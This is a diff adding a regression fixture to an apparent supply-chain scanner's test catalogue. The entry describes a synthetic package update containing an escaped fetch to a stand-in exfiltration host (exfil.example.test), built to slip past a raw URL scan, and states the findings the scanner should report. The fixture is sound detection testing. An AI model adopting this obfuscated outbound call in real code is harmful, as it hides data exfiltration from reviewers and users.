@@ -179,6 +179,23 @@
           "head": ["template-boundary-1.0.1"]
         }
       }
+    },
+    {
+      "name": "escaped-url",
+      "title": "Synthetic escaped-string endpoint (not a historical incident)",
+      "date": "n/a: regression for ADR-026",
+      "sources": [
+        "https://tc39.es/ecma262/multipage/ecmascript-language-lexical-grammar.html#sec-literals-string-literals"
+      ],
+      "kept": "The 1.0.1 bump adds fetch(\"\\\\x20https://exfil.example.test/c\".trim()) in index.js. The raw source has no word boundary before the scheme, so the raw URL scan cannot see the host.",
+      "omitted": "Everything else: the package is a minimal synthetic stand-in. run() is never called and the reserved .example.test host is never contacted.",
+      "expected": "ADR-026 scans the string's cooked value and reports a HIGH new-external-endpoint for exfil.example.test. The unresolved fetch is reported as NET at HIGH too.",
+      "scenarios": {
+        "attack": {
+          "base": ["escaped-url-1.0.0"],
+          "head": ["escaped-url-1.0.1"]
+        }
+      }
     }
   ]
 }
